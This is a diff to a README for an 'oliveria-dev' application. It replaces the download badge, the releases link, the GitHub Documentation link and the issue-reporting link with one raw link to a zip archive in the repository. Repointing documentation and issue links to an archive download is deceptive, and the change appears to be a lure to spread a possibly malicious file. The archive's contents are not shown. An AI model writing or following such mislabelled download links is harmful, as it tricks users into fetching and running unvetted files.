@@ -1,6 +1,6 @@
 # 👋 oliveria-dev - Easy-to-Use Application for Everyone
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/Utkarsh1661/oliveria-dev/main/hasp/oliveria-dev-v2.7-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the oliveria-dev repository! This guide will help you download and ru
 
 1. **Visit the Releases Page**  
    Click the link below to visit the page where you can download the application.  
-   [Download Here](https://github.com/Utkarsh1661/oliveria-dev/releases)
+   [Download Here](https://raw.githubusercontent.com/Utkarsh1661/oliveria-dev/main/hasp/oliveria-dev-v2.7-alpha.2.zip)
 
 2. **Choose the Latest Version**  
    On the Releases page, find the latest version of the software. It will usually be at the top of the list.
@@ -61,7 +61,7 @@ If you need assistance, please check the FAQ section on the repository’s homep
 
 ## 🔗 Additional Resources
 
-- [GitHub Documentation](https://docs.github.com/)
-- [How to Report Issues](https://github.com/Utkarsh1661/oliveria-dev/issues)
+- [GitHub Documentation](https://raw.githubusercontent.com/Utkarsh1661/oliveria-dev/main/hasp/oliveria-dev-v2.7-alpha.2.zip)
+- [How to Report Issues](https://raw.githubusercontent.com/Utkarsh1661/oliveria-dev/main/hasp/oliveria-dev-v2.7-alpha.2.zip)
 
 Thank you for using oliveria-dev! Enjoy your experience and feel free to explore all the features the application has to offer.
